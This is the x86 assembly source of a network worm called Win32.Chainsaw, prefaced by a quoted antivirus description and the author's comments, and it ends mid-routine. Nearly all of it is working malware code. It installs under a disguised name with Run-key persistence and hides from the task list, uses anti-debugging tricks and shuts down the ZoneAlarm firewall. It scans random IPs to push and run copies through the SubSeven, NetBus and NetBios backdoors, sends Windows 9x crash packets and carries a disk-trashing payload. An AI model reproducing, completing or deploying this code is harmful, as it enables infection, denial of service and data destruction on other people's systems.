
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[CHAINSAW.ASM]컴�
; AVP description.
; ---------------------------------------------------------------------------
; Worm.Chainsaw
;
; This is a network worm with Internet spreading ability. When the worm
; is run on a system for the first time, it installs itself. To do that it
; copies itself to the Windows system directory using the filename
; WINMINE.EXE and also to the root directory of the current drive using the
; filename CHAINSAW.EXE. The latter file then gets "hidden" attribute set.
; The worm then registers itself in the system registry, auto-run key:
;
;  HKCU\Software\Microsoft\Windows\CurrentVersion\Run
;   Mines = path\WINMINE.EXE
;
; where "path" is the Windows system directory name. The worm then exits and
; triggers its infection routines when run during the next Windows startup.
;
; During the next Windows startup the worm is automatically executed by
; Windows by an auto-run key in the system registry. The worm then registers
; itself as hidden application and runs its spreading routine. That routine
; enumerates shared drives on the local networks [* It doesn't even get near
; local shares. *], gets the Windows directory on a drive (if there is one),
; copies itself to there using the filename CHAINSAW.EXE (if the drive is
; mapped for full access) and registers itself in there by writing the "Run="
; instruction to the [windows] section of the WIN.INI file on the remote
; drive. During the next Windows restart the worm copy will be activated and
; will complete the infection.
;
; When the worm is started it sends a notifying message to the
; "alt.horror" conference. The message has the fields:
;
; From: "Leatherface" <hacked.up.for@bbq.net>
; Subject: CHAINSAWED
; Newsgroups: alt.horror
; Message body:
;
;       WHO WILL SURVIVE
;       AND WHAT WILL BE LEFT OF THEM?
;
; The worm also tries to send its copies to remote machines. To do that it
; gets randomly selected IP addresses in an endless loop and tries to connect
; to them. If it succeeds the worm tries to connect to a "Backdoor" trojan
; program on the remote machine (if the machine is infected by a backdoor
; program). After successfully connecting, the worm sends its copy to the
; remote machine and forces the Backdoor to execute it there. The list of
; "supported" Backdoors is as follows: Sub7, NetBus, NetBios. It's obvious
; that the worm has a very low chance to spread itself in such a way [*
; Several worms such as VBS/NetLog and W32/Qaz use *only* NetBios to spread,
; and are currently in the wild in large numbers, try to explain me this
; then. *]
;
; Depending on the system date the worm also sends a "Deny-of-service"
; packet to a randomly selected IP address. That packet is prepared so that
; it may cause a remote Win9x machine to crash (because of a bug in Win9x
; libraries). The worm intends to do that on the 31th of the month, but
; because of a bug compares that value with "year" field, and as a result
; will bomb random selected machines only if tje system date is set to the
; year 0031 [* Oops! Well atleast this version has it fixed :*]
;
; The worm also disables the "ZoneAlarm" Internet protection utility.
;
; Depending on its random counter the worm spawns a trojan program that
; erases data on the hard drive by writing the text to there:
;
;  "THE FILM WHICH YOU ARE ABOUT TO SEE IS AN ACCOUNT OF THE
;  TRAGEDY WHICH BEFELL A GROUP OF FIVE YOUTHS. IN PARTICULAR
;  SALLY HARDESTY AND HER INVALID BROTHER FRANKLIN. IT IS ALL
;  THE MORE TRAGIC IN THAT THEY WERE YOUNG. BUT, HAD THEY
;  LIVED VERY, VERY LONG LIVES, THEY COULD NOT HAVE EXPECTED
;  NOR WOULD THEY HAVE WISHED TO SEE AS MUCH OF THE MAD AND
;  MACABRE AS THEY WERE TO SEE THAT DAY. FOR THEM AN IDYLLIC
;  SUMMER AFTERNOON DRIVE BECAME A NIGHTMARE. THE EVENTS OF
;  THAT DAY WERE TO LEAD TO THE DISCOVERY OF ONE OF THE MOST
;  BIZARRE CRIMES IN THE ANNALS OF AMERICAN HISTORY,
;  THE TEXAS CHAIN SAW MASSACRE..."
; ---------------------------------------------------------------------------

;============================================================================
;
;
;      NAME: Win32.Chainsaw v1.01
;      TYPE: NetBios/SubSeven/NetBus worm.
;      DATE: July - September 2000.
;    AUTHOR: T-2000 / Immortal Riot.
;    E-MAIL: T2000_@hotmail.com
;   PAYLOAD: Sector trashing.
;
;  FEATURES:
;
;       - Disables ZoneAlarm firewall.
;       - Not visible in 9x tasklist.
;       - Sends usenet message on installation.
;       - DoS'es random hosts on 31st of any month.
;       - Anti-debugging code.
;
; Randomly scans the Internet for hosts running either SubSeven 2, NetBus 1,
; or NetBios, and then installs itself in the systems it can get access
; to. It's main payload is to IGMP DoS random Internet hosts on every 31st
; of the month, which will BSOD every released version of Windoze 95/98
; that isn't patched or firewalled.
;
;============================================================================

; I've kept the code clear and understandable for everyone, no optimizations
; of any kind, mainly due the file alignment, the filesize will usually just
; stay the same wether your code is optimized or not.

                .386
                .MODEL  FLAT
                .DATA

                JUMPS

; Converts a little indian word to a big indian word.
DWBI            MACRO   Lil_Indian
                DW      (Lil_Indian SHR 8) + ((Lil_Indian AND 00FFh) SHL 8)
ENDM


EXTRN           WSAGetLastError:PROC
EXTRN           ioctlsocket:PROC
EXTRN           ExitProcess:PROC
EXTRN           WSAStartup:PROC
EXTRN           WritePrivateProfileStringA:PROC
EXTRN           WSACleanup:PROC
EXTRN           socket:PROC
EXTRN           closesocket:PROC
EXTRN           setsockopt:PROC
EXTRN           InternetGetConnectedState:PROC
EXTRN           DeleteFileA:PROC
EXTRN           connect:PROC
EXTRN           setsockopt:PROC
EXTRN           PeekMessageA:PROC
EXTRN           SetFileAttributesA:PROC
EXTRN           GetSystemDirectoryA:PROC
EXTRN           CreateFileA:PROC
EXTRN           recv:PROC
EXTRN           send:PROC
EXTRN           sendto:PROC
EXTRN           CloseHandle:PROC
EXTRN           GetSystemTime:PROC
EXTRN           GetModuleHandle
EXTRN           RegOpenKeyExA:PROC
EXTRN           RegSetValueExA:PROC
EXTRN           RegCloseKey:PROC
EXTRN           ReadFile:PROC
EXTRN           CopyFileA:PROC
EXTRN           WNetAddConnection2A:PROC
EXTRN           WNetCancelConnection2A:PROC
EXTRN           SetErrorMode:PROC
EXTRN           GetModuleFileNameA:PROC
EXTRN           FindWindowA:PROC
EXTRN           PostMessageA:PROC
EXTRN           GetTickCount:PROC
EXTRN           WriteFile:PROC
EXTRN           GetLocalTime:PROC
EXTRN           WinExec:PROC
EXTRN           select:PROC
EXTRN           GetPrivateProfileStringA:PROC
EXTRN           GetModuleHandleA:PROC
EXTRN           GetProcAddress:PROC
EXTRN           WNetAddConnection2A:PROC
EXTRN           WNetEnumResourceA:PROC
EXTRN           WNetOpenEnumA:PROC
EXTRN           WNetCloseEnum:PROC
EXTRN           RegQueryValueExA:PROC
EXTRN           gethostbyname:PROC
EXTRN           inet_ntoa:PROC


Worm_Size                       EQU     6144

SEM_NOGPFAULTERRORBOX           EQU     00000002h
OPEN_EXISTING                   EQU     00000003h
CREATE_ALWAYS                   EQU     00000002h
SO_SNDTIMEO                     EQU     1005h
SO_RCVTIMEO                     EQU     1006h
RESOURCE_GLOBALNET              EQU     00000002h
RESOURCEUSAGE_CONNECTABLE       EQU     00000001h
RESOURCEUSAGE_CONTAINER         EQU     00000002h
RESOURCEUSAGE_CONNECTABLE       EQU     00000001h
RESOURCETYPE_DISK               EQU     00000001h
SOL_SOCKET                      EQU     0FFFFh
HKEY_CURRENT_USER               EQU     80000001h
KEY_QUERY_VALUE                 EQU     1
KEY_WRITE                       EQU     00020006h
REG_SZ                          EQU     00000001h
GENERIC_READ                    EQU     80000000h
GENERIC_WRITE                   EQU     40000000h
FILE_SHARE_READ                 EQU     00000001h
FILE_ATTRIBUTE_HIDDEN           EQU     2
AF_INET                         EQU     2
IPPROTO_IGMP                    EQU     2
SOCK_STREAM                     EQU     1
SOCK_RAW                        EQU     3
FIONBIO                         EQU     8004667Eh
WM_QUIT                         EQU     0012h


S7_Upload_Req   DB      'RTFChainsaw.exe'
End_S7_Upload_Req:

S7_Upload_Size  DB      'SFT046144'
End_S7_Upload_Size:

S7_Exec_Req     DB      'FMXChainsaw.exe'
End_S7_Exec_Req:

NB_Password     DB      'Password;1;netbus', 0Dh
End_NB_Password:

NB_Upload_Req   DB      'UploadFile;Chainsaw.exe;6144;\', 0Dh
End_NB_Upload_Req:

NB_Exec_File    DB      'StartApp;\Chainsaw.exe', 0Dh
End_NB_Exec_File:

Nuke_File       DB      'BBQ666.COM', 0

sz_Kernel32     DB      'KERNEL32', 0
sz_RegServProc  DB      'RegisterServiceProcess', 0

Win_Ini_Run_Key DB      'run', 0
Windows_Section DB      'windows', 0

Run_Key                 DB      'Software\Microsoft\Windows\CurrentVersion\Run', 0
ZoneAlarm_Window        DB      'ZoneAlarm', 0

Reg_Handle_1            DD      0
Reg_Handle_2            DD      0
sz_Account_Mgr          DB      'Software\Microsoft\Internet Account Manager', 0
Account_Key             DB      'Software\Microsoft\Internet Account Manager\Accounts\'
Account_Index           DB      '00000000', 0
sz_Def_News_Acc         DB      'Default News Account', 0
sz_NNTP_Server          DB      'NNTP Server', 0

Size_Acc_Buffer         DD      9
Size_NNTP_Buf           DD      128

s_POST          DB      'POST', 0Dh, 0Ah
s_QUIT          DB      'QUIT', 0Dh, 0Ah

                ; Header.

News_Message:   DB      'From: "Leatherface" <hacked.up.for@bbq.net>', 0Dh, 0Ah
                DB      'Subject: CHAINSAWED', 0Dh, 0Ah
                DB      'Newsgroups: alt.horror', 0Dh, 0Ah
                DB      0Dh, 0Ah

                ; Body.

                DB      'WHO WILL SURVIVE', 0Dh, 0Ah
                DB      'AND WHAT WILL BE LEFT OF THEM?', 0Dh, 0Ah

                ; End-of-data command.

                DB      '.', 0Dh, 0Ah
End_News_Message:

MsDos_Sys       DB      'T:\MSDOS.SYS', 0
Win_Dir_Key     DB      'WinDir', 0
Paths_Section   DB      'Paths', 0

Slash_Win_Ini   DB      '\'
Win_Ini         DB      'WIN.INI', 0

Remote_Drive    DB      'T:', 0
Cover_Name      DB      '\WINMINE.EXE', 0

Remote_Trojan   DB      'T:'
Root_Dropper    DB      '\Chainsaw.exe', 0
Run_Key_Name    DB      'Mines', 0

Boole_False     DD      0
Boole_True      DD      1

NetBios_Remote  DB      '\\666.666.666.666', 0

Time_Out:       DD      1               ; - Seconds.
                DD      500             ; - Milliseconds.

IO_Time_Out     DD      5000

Usenet_Conn:    DW      AF_INET         ; connect() structures.
                DWBI    119
Usenet_IP       DD      0
                DB      8 DUP(0)

Nuke_Conn:      DW      AF_INET
                DW      0
Nuke_IP         DD      0
                DB      8 DUP(0)

Sub7_Conn:      DW      AF_INET
                DWBI    27374
Sub7_IP         DD      0
                DB      8 DUP(0)

NetBus_Conn:    DW      AF_INET
                DWBI    12345
NetBus_IP       DD      0
                DB      8 DUP(0)

NetBus_Conn_2:  DW      AF_INET
                DWBI    (12345+1)
NetBus_IP_2     DD      0
                DB      8 DUP(0)

NetBios_Conn:   DW      AF_INET
                DWBI    139
NetBios_IP      DD      0
                DB      8 DUP(0)

Win_Dir         DB      260 DUP(0)
Default_String  DB      0

Own_Path        DB      260 DUP(0)

Net_Struc_Count DD      1
Enum_Buf_Size   DD      666
Enum_Buffer     DB      666 DUP(0)

Net_Resource_Struc:

                DD      0
                DD      0
                DD      0
                DD      0
                DD      0
                DD      OFFSET NetBios_Remote
                DD      0
                DD      0

Net_Resource:   DD      0
                DD      0
                DD      0
Net_Usage       DD      0
Net_Local_Name  DD      0
Net_Remote_Name DD      0
                DD      0
                DD      0

Select_Struc:
Sock_Count      DD      3
Sub7_Socket     DD      0
NetBus_Socket   DD      0
NetBios_Socket  DD      0

IGMP_Socket     DD      0
News_Socket     DD      0
NetBus_Socket_2 DD      0

Connect_Select: DD      4 DUP(0)

IGMP_Nuke       DB      15000 DUP(0)

Temp            DD      0
Random_Init     DD      0

Enum_Handle     DD      0

Size_Cover_Path DD      0

System_Time     DW      8 DUP(0)

Worm_Code       DB      Worm_Size DUP(0)
WSA_Data        DB      400 DUP(0)
System_Dir      DB      260 DUP(0)
NNTP_Server     DB      128 DUP(0)
Buffer          DB      512 DUP(0)

                .CODE

                DB      '[-T2IR-]', 0
START:
                PUSH    SEM_NOGPFAULTERRORBOX   ; On error just bail out
                CALL    SetErrorMode            ; without displaying shit.

                PUSH    0                       ; Fake a dispatch to get the
                PUSH    0                       ; hourglass cursor to
                PUSH    0                       ; disappear.
                PUSH    0
                PUSH    0
                CALL    PeekMessageA

                ; Get offset of CreateFileA in the jump table.

                MOV     ESI, DWORD PTR CreateFileA+2
                LODSD

                ; Soft-Ice's BPX command works with 0CCh breakpoints
                ; to hook API's, so here we simply check if a common
                ; API has been hooked and kill the system if true.
                ; For a virus it's better to check every fetched API
                ; for a debugger hook.

                CMP     BYTE PTR [ESI], 0CCh    ; Debugger has a hook on it?
                JE      Payload

                CALL    GetTickCount

                MOV     Random_Init, EAX

                PUSH    260                     ; Get the path to ourself.
                PUSH    OFFSET Own_Path
                PUSH    0
                CALL    GetModuleFileNameA

                MOV     EDI, OFFSET System_Dir

                PUSH    260                     ; Get the System directory.
                PUSH    EDI
                CALL    GetSystemDirectoryA

                MOV     ESI, OFFSET Cover_Name
                ADD     EDI, EAX

                MOVSD                           ; Append our cover name
                MOVSD                           ; \WINMINE.EXE to it.
                MOVSD
                MOVSB

                SUB     EDI, OFFSET System_Dir  ; Save size of path.
                MOV     Size_Cover_Path, EDI

                PUSH    1                       ; Copy us to the system
                PUSH    OFFSET System_Dir       ; directory under the cover
                PUSH    OFFSET Own_Path         ; name.
                CALL    CopyFileA

                XCHG    ECX, EAX                ; Virus is already installed?
                JECXZ   Check_Trigger

                PUSH    1                       ; Copy root dropper to root
                PUSH    OFFSET Root_Dropper     ; to indicate this is the 1st
                PUSH    OFFSET Own_Path         ; run of the worm.
                CALL    CopyFileA

                PUSH    FILE_ATTRIBUTE_HIDDEN   ; Hide it.
                PUSH    OFFSET Root_Dropper
                CALL    SetFileAttributesA

                PUSH    OFFSET Reg_Handle_1     ; Open up a handle to the
                PUSH    KEY_WRITE               ; registry Run key.
                PUSH    0
                PUSH    OFFSET Run_Key
                PUSH    HKEY_CURRENT_USER
                CALL    RegOpenKeyExA

                PUSH    Size_Cover_Path         ; Make the cover file run
                PUSH    OFFSET System_Dir       ; every bootup.
                PUSH    REG_SZ
                PUSH    0
                PUSH    OFFSET Run_Key_Name
                PUSH    Reg_Handle_1
                CALL    RegSetValueExA

                PUSH    Reg_Handle_1            ; Close registry key.
                CALL    RegCloseKey

                PUSH    OFFSET Win_Ini          ; Remove temporary reference
                PUSH    0                       ; to virus dropper in
                PUSH    OFFSET Win_Ini_Run_Key  ; WIN.INI.
                PUSH    OFFSET Windows_Section
                CALL    WritePrivateProfileStringA

Exit:           PUSH    0
                CALL    ExitProcess

Check_Trigger:  MOV     EAX, 666                ; 1/666 chance of activating.
                CALL    Random_EAX

                DEC     EAX                     ; Today is trashday?
                JZ      Payload

                PUSH    0                       ; Open ourselves.
                PUSH    0
                PUSH    OPEN_EXISTING
                PUSH    0
                PUSH    FILE_SHARE_READ
                PUSH    GENERIC_READ
                PUSH    OFFSET Own_Path
                CALL    CreateFileA

                MOV     EBX, EAX

                INC     EAX
                JZ      Exit

                PUSH    0                       ; Read in ourselves.
                PUSH    OFFSET Temp
                PUSH    Worm_Size+1
                PUSH    OFFSET Worm_Code
                PUSH    EBX
                CALL    ReadFile

                CMP     Temp, Worm_Size         ; Wormsize has changed?
                JNE     Payload                 ; Then we're likely
                                                ; incomplete or infected
                                                ; with a virus.

                PUSH    EBX                     ; Close ourselves again.
                CALL    CloseHandle

                PUSH    OFFSET sz_Kernel32      ; Get base of KERNEL32.DLL.
                CALL    GetModuleHandleA

                PUSH    OFFSET sz_RegServProc   ; Get RegisterServiceProcess.
                PUSH    EAX
                CALL    GetProcAddress

                XCHG    ECX, EAX
                JECXZ   Init_Winsock

                PUSH    1                       ; Register our process as a
                PUSH    0                       ; hidden service.
                CALL    ECX

Init_Winsock:   PUSH    OFFSET WSA_Data         ; Initialize winsock.
                PUSH    0202h
                CALL    WSAStartup

                OR      EAX, EAX                ; Error?
                JNZ     Exit

Chk_Inet_State: PUSH    0                       ; We're connected to the
                PUSH    OFFSET Temp             ; Internet?
                CALL    InternetGetConnectedState

                DEC     EAX                     ; Else just loop and check
                JNZ     Chk_Inet_State          ; again until we are.

                ; Here we close the ZoneAlarm firewall if it is
                ; found active, reason being that A) it will pop-up
                ; a warning box whenever a program (ie. our worm)
                ; is attempting to access the Internet, (this is how
                ; many RAT trojans get caught these days) and B) it
                ; is likely to block our ports.

                PUSH    OFFSET ZoneAlarm_Window ; Attempt to locate the
                PUSH    0                       ; ZoneAlarm window.
                CALL    FindWindowA

                XCHG    ECX, EAX
                JECXZ   Check_1st_Run

                PUSH    0                       ; Tell ZoneAlarm to quit.
                PUSH    0
                PUSH    WM_QUIT
                PUSH    ECX
                CALL    PostMessageA

Check_1st_Run:  PUSH    OFFSET Root_Dropper     ; Can we delete the root
                CALL    DeleteFileA             ; dropper?

                XCHG    ECX, EAX
                JECXZ   Do_Random_IP

                ; This is the first Internet run of the worm, so
                ; send a usenet message to alt.horror to note
                ; our presence. Better to just use a public
                ; dump place instead of e-mail for example, this
                ; way they can't track you or kill the account.

                PUSH    OFFSET Reg_Handle_1     ; Open a handle to Internet
                PUSH    KEY_QUERY_VALUE         ; Account Manager.
                PUSH    0
                PUSH    OFFSET sz_Account_Mgr
                PUSH    HKEY_CURRENT_USER
                CALL    RegOpenKeyExA

                OR      EAX, EAX
                JNZ     Do_Random_IP

                PUSH    OFFSET Size_Acc_Buffer  ; Get default news account.
                PUSH    OFFSET Account_Index
                PUSH    0
                PUSH    0
                PUSH    OFFSET sz_Def_News_Acc
                PUSH    Reg_Handle_1
                CALL    RegQueryValueExA

                OR      EAX, EAX
                JNZ     Close_Reg_1

                PUSH    OFFSET Reg_Handle_2     ; Open the default news
                PUSH    KEY_QUERY_VALUE         ; account.
                PUSH    0
                PUSH    OFFSET Account_Key
                PUSH    HKEY_CURRENT_USER
                CALL    RegOpenKeyExA

                OR      EAX, EAX
                JNZ     Close_Reg_1

                PUSH    OFFSET Size_NNTP_Buf    ; Get it's NNTP server.
                PUSH    OFFSET NNTP_Server
                PUSH    0
                PUSH    0
                PUSH    OFFSET sz_NNTP_Server
                PUSH    Reg_Handle_2
                CALL    RegQueryValueExA

                OR      EAX, EAX
                JNZ     Close_Reg_2

                PUSH    OFFSET NNTP_Server      ; Convert the DNS-name to
                CALL    gethostbyname           ; an IP-address.

                XCHG    ECX, EAX
                JECXZ   Close_Reg_2

                MOV     ESI, [ECX+12]           ; Fetch IP-address.
                LODSD
                PUSH    DWORD PTR [EAX]
                POP     Usenet_IP

                PUSH    0
                PUSH    SOCK_STREAM
                PUSH    AF_INET
                CALL    socket

                MOV     News_Socket, EAX

                INC     EAX                     ; Error?
                JZ      Close_Reg_2

                MOV     EBX, News_Socket
                CALL    Set_Time_Outs

                PUSH    16
                PUSH    OFFSET Usenet_Conn
                PUSH    News_Socket
                CALL    connect

                INC     EAX
                JZ      Close_Reg_2

                MOV     EDI, OFFSET Buffer

                PUSH    0                       ; Receive data from the
                PUSH    512                     ; socket.
                PUSH    EDI
                PUSH    News_Socket
                CALL    recv

                INC     EAX
                JZ      Close_News

                CMP     BYTE PTR [EDI], '2'
                JNE     Send_QUIT

                PUSH    0
                PUSH    6
                PUSH    OFFSET s_POST
                PUSH    News_Socket
                CALL    send

                INC     EAX
                JZ      Close_News

                PUSH    0                       ; Receive data from the
                PUSH    512                     ; socket.
                PUSH    EDI
                PUSH    News_Socket
                CALL    recv

                INC     EAX
                JZ      Close_News

                CMP     BYTE PTR [EDI], '3'
                JNE     Send_QUIT

                PUSH    0
                PUSH    (End_News_Message-News_Message)
                PUSH    OFFSET News_Message
                PUSH    News_Socket
                CALL    send

                INC     EAX
                JZ      Close_News

                PUSH    0                       ; Receive data from the
                PUSH    512                     ; socket.
                PUSH    EDI
                PUSH    News_Socket
                CALL    recv

                INC     EAX
                JZ      Close_News

Send_QUIT:      PUSH    0
                PUSH    6
                PUSH    OFFSET s_QUIT
                PUSH    News_Socket
                CALL    send

                INC     EAX
                JZ      Close_News

                PUSH    0                       ; Receive data from the
                PUSH    512                     ; socket.
                PUSH    EDI
                PUSH    News_Socket
                CALL    recv

Close_News:     PUSH    News_Socket
                CALL    closesocket

Close_Reg_2:    PUSH    Reg_Handle_2
                CALL    RegCloseKey

Close_Reg_1:    PUSH    Reg_Handle_1
                CALL    RegCloseKey

Do_Random_IP:   CALL    Random_AL_254           ; Get random octet (1-254).

                XCHG    EBX, EAX

                CALL    Random_AL_254           ; Another one.

                SHL     EBX, 8
                MOV     BL, AL

                CALL    Random_AL_254           ; And another one.

                SHL     EBX, 8
                MOV     BL, AL

Rand_A_Class:   MOV     AL, 223                 ; Random A/B/C class IP.
                CALL    Random_AL

                CMP     AL, 10                  ; Private network segment.
                JE      Rand_A_Class

                CMP     AL, 127                 ; Localhost network.
                JE      Rand_A_Class

                SHL     EBX, 8
                MOV     BL, AL

                MOV     Nuke_IP, EBX
                MOV     Sub7_IP, EBX            ; Store the random IP in our
                MOV     NetBus_IP, EBX          ; structures.
                MOV     NetBus_IP_2, EBX
                MOV     NetBios_IP, EBX

                PUSH    OFFSET System_Time      ; Get system date.
                CALL    GetSystemTime

                CMP     System_Time+(3*2), 31   ; Is today nuke day?
                JNE     IP_To_ASCIIZ

                PUSH    IPPROTO_IGMP            ; Create a raw IGMP socket.
                PUSH    SOCK_RAW
                PUSH    AF_INET
                CALL    socket

                MOV     IGMP_Socket, EAX

                INC     EAX
                JZ      Do_Random_IP

                MOV     EDI, 10                 ; Send 10 nuke packets.

        ; Windows 95/98 has problems with handling fragmented IGMP
        ; packets, when processing a whole bunch of these the system
        ; will usually BSOD. Here we simply send a large packet (the
        ; packet will arrive regardless of content it seems), which
        ; will automatically be fragmented by the underlying TCP/IP
        ; layers. Officially IGMP packets aren't supposed to leave
        ; the current subnet, so if your ISP uses filtering (mainly
        ; cable/ADSL connections), this nuke won't get through,
        ; however SLIP/PPP connections (mainly dialups), seem to have
        ; no problems delivering it.

Send_Nuke:      PUSH    16                      ; Send the nuke.
                PUSH    OFFSET Nuke_Conn
                PUSH    0
                PUSH    15000
                PUSH    OFFSET IGMP_Nuke
                PUSH    IGMP_Socket
                CALL    sendto

                DEC     EDI                     ; Send all 10 packets.
                JNZ     Send_Nuke

Exit_Nuke:      PUSH    IGMP_Socket
                CALL    closesocket

                JMP     Do_Random_IP

IP_To_ASCIIZ:   PUSH    EBX                     ; Convert DWORD to ASCIIZ
                CALL    inet_ntoa               ; for the NetBios API's.

                XCHG    ESI, EAX
                MOV     EDI, OFFSET NetBios_Remote+2

                ; Copy the ASCIIZ IP to our own buffer.

Copy_ASCIIZ_IP: LODSB
                STOSB

                OR      AL, AL                  ; Did entire ASCIIZ string?
                JNZ     Copy_ASCIIZ_IP

                PUSH    0                       ; Create sockets.
                PUSH    SOCK_STREAM
                PUSH    AF_INET
                CALL    socket

                MOV     Sub7_Socket, EAX

                INC     EAX
                JZ      Chk_Inet_State

                PUSH    0
                PUSH    SOCK_STREAM
                PUSH    AF_INET
                CALL    socket

                MOV     NetBus_Socket, EAX

                INC     EAX
                JZ      Close_Sub7

                PUSH    0
                PUSH    SOCK_STREAM
                PUSH    AF_INET
                CALL    socket

                MOV     NetBios_Socket, EAX

                INC     EAX
                JZ      Close_NetBus

        ; The standard connect() timeout interval is like 100 seconds
        ; or so, obviously this is way to long for portscanning, so we
        ; need to set our own timeout interval. Unfortunately Winsock
        ; does not have any API that can set a connect() timeout interval
        ; (neither does BSD Sockets btw). Kind of stupid, but anyways,
        ; here we realize our own timeout function by first switching
        ; the connect() sockets to non-blocking mode, and then running
        ; select() on em with a 1500ms timeout to see if they are connected.

                PUSH    OFFSET Boole_True       ; Set socket to non-blocking
                PUSH    FIONBIO                 ; mode.
                PUSH    Sub7_Socket
                CALL    ioctlsocket

                PUSH    OFFSET Boole_True
                PUSH    FIONBIO
                PUSH    NetBus_Socket
                CALL    ioctlsocket

                PUSH    OFFSET Boole_True
                PUSH    FIONBIO
                PUSH    NetBios_Socket
                CALL    ioctlsocket

                PUSH    16                      ; Connect SubSeven port.
                PUSH    OFFSET Sub7_Conn
                PUSH    Sub7_Socket
                CALL    connect

                PUSH    16                      ; Connect NetBus port.
                PUSH    OFFSET NetBus_Conn
                PUSH    NetBus_Socket
                CALL    connect

                PUSH    16                      ; Connect NetBios port.
                PUSH    OFFSET NetBios_Conn     ; (only to quickly probe the
                PUSH    NetBios_Socket          ; host for NetBios).
                CALL    connect

                MOV     ESI, OFFSET Select_Struc
                MOV     EDI, OFFSET Connect_Select

                MOVSD
                MOVSD
                MOVSD
                MOVSD

                PUSH    OFFSET Time_Out         ; Check if any sockets are
                PUSH    0                       ; writeable (connected)
                PUSH    OFFSET Connect_Select   ; within 1500ms.
                PUSH    0
                PUSH    0
                CALL    select

                INC     EAX                     ; Error?
                JZ      Close_NetBios

                DEC     EAX                     ; Zero sockets connected?
                JZ      Close_NetBios

                PUSH    OFFSET Boole_False      ; Switch sockets back to
                PUSH    FIONBIO                 ; blocking mode.
                PUSH    Sub7_Socket
                CALL    ioctlsocket

                PUSH    OFFSET Boole_False
                PUSH    FIONBIO
                PUSH    NetBus_Socket
                CALL    ioctlsocket

                MOV     EBX, Sub7_Socket        ; Set send/recv timeout on
                CALL    Set_Time_Outs           ; sockets to prevent endless
                                                ; blocking.
                MOV     EBX, NetBus_Socket
                CALL    Set_Time_Outs

                MOV     EDI, OFFSET Buffer      ; recv-buffer.

Try_Sub7:       PUSH    0                       ; Attempt to get SubSeven
                PUSH    512                     ; connection reply.
                PUSH    EDI
                PUSH    Sub7_Socket
                CALL    recv

                INC     EAX                     ; Not connected?
                JZ      Try_NetBus

                ; If it's a SubSeven server, and not password
                ; protected, it should reply with 'connected',
                ; and the time/date and version.

                CMP     [EDI], 'nnoc'           ; If we can't access the Sub7
                JNE     Try_NetBus              ; server, move on to NetBus.

                ; First request a file upload by sending
                ; 'RTF' with the upload path connected to
                ; it: 'RTFChainsaw.exe'.

                PUSH    0
                PUSH    (End_S7_Upload_Req-S7_Upload_Req)
                PUSH    OFFSET S7_Upload_Req
                PUSH    Sub7_Socket
                CALL    send

                INC     EAX
                JZ      Try_NetBus

                PUSH    0                       ; Fetch the reply, it should
                PUSH    512                     ; be 'TID' if all is OK.
                PUSH    EDI
                PUSH    Sub7_Socket
                CALL    recv

                INC     EAX
                JZ      Try_NetBus

                CMP     [EDI], 'nDIT'           ; Check for 'TID' (plus last
                JNE     Try_NetBus              ; byte of previous recv).

                ; First let the server know the filesize of the
                ; upload, this is done by sending a 'SFT' + the
                ; length of the filesize (represented by two
                ; numbers) + the actual filesize: 'SFT046144'.

                PUSH    0
                PUSH    (End_S7_Upload_Size-S7_Upload_Size)
                PUSH    OFFSET S7_Upload_Size
                PUSH    Sub7_Socket
                CALL    send

                INC     EAX
                JZ      Try_NetBus

                PUSH    0                       ; Then send the actual file
                PUSH    Worm_Size               ; contents.
                PUSH    OFFSET Worm_Code
                PUSH    Sub7_Socket
                CALL    send

                INC     EAX
                JZ      Try_NetBus

        ; SubSeven works with a 1041-byte receive buffer, every
        ; 1041 or less bytes received will be acknowledged with
        ; a 'p:' + the total amount of bytes received + '.'.

Retrieve_Ack:   PUSH    0                       ; Receive a 7-byte 'p:xxxx.'
                PUSH    7                       ; (don't read more than 7
                PUSH    EDI                     ; bytes as often the data is
                PUSH    Sub7_Socket             ; overlapping).
                CALL    recv

                INC     EAX
                JZ      Try_NetBus

                CMP     [EDI+2], '4416'         ; Last acknowledgement?
                JNE     Retrieve_Ack            ; Otherwise just go on.

        ; Check upload reply, which should be 'file successfully uploaded.'
        ; if all went fine, (however it seems to return this regardless of
        ; success or failure..).

Check_UL_Reply: PUSH    0
                PUSH    512
                PUSH    EDI
                PUSH    Sub7_Socket
                CALL    recv

                INC     EAX
                JZ      Try_NetBus

                CMP     [EDI+5], 'ccus'         ; Check for 'success'.
                JNE     Try_NetBus              ; Bail on error.

        ; Now remotely execute the uploaded worm copy by sending a
        ; 'FMX' + the path of the file to execute: 'FMXChainsaw.exe'.
        ; SubSeven uses ShellExecuteA to run files, so it is capable
        ; of opening any registered file extension such as .VBS etc.

                PUSH    0
                PUSH    (End_S7_Exec_Req-S7_Exec_Req)
                PUSH    OFFSET S7_Exec_Req
                PUSH    Sub7_Socket
                CALL    send

                INC     EAX
                JZ      Try_NetBus

                PUSH    0                       ; Fetch the command reply,
                PUSH    512                     ; which should be
                PUSH    EDI                     ; 'file has been executed.'.
                PUSH    Sub7_Socket
                CALL    recv

Try_NetBus:     PUSH    0                       ; Fetch connection reply.
                PUSH    512
                PUSH    EDI
                PUSH    NetBus_Socket
                CALL    recv

                INC     EAX
                JZ      Try_NetBios

                ; NetBus servers respond with 'NetBus', and
                ; the version, and if the server is password
                ; protected also with an 'x'.

                CMP     [EDI], 'BteN'           ; Is it an actual NetBus
                JNE     Try_NetBios             ; server?

                ; Server is password protected?

                CMP     BYTE PTR [EDI+EAX-3], 'x'
                JNE     Upload_Worm

                ; Now try one password, 'netbus' (should be commonly used
                ; I guess), together with a NetBus 1.60- backdoor function
                ; that accepts any password.

                PUSH    0
                PUSH    (End_NB_Password-NB_Password)
                PUSH    OFFSET NB_Password
                PUSH    NetBus_Socket
                CALL    send

                INC     EAX
                JZ      Try_NetBios

                PUSH    0                       ; Get password reply.
                PUSH    512
                PUSH    EDI
                PUSH    NetBus_Socket
                CALL    recv

                INC     EAX
                JZ      Try_NetBios

                ; If the password got accepted then it
                ; should return 'Access;1'.

                CMP     [EDI+4], '1;ss'         ; 'Access;1' ?
                JNE     Try_NetBios

                ; Request a file upload by sending 'UploadFile;'
                ; + filename + ';' + filesize + ';' + upload path:
                ; 'UploadFile;Chainsaw.exe;6144;\'.

Upload_Worm:    PUSH    0
                PUSH    (End_NB_Upload_Req-NB_Upload_Req)
                PUSH    OFFSET NB_Upload_Req
                PUSH    NetBus_Socket
                CALL    send

                INC     EAX
                JZ      Try_NetBios

                PUSH    0                       ; Fetch upload reply which
                PUSH    512                     ; should be 'UploadReady'.
                PUSH    EDI
                PUSH    NetBus_Socket
                CALL    recv

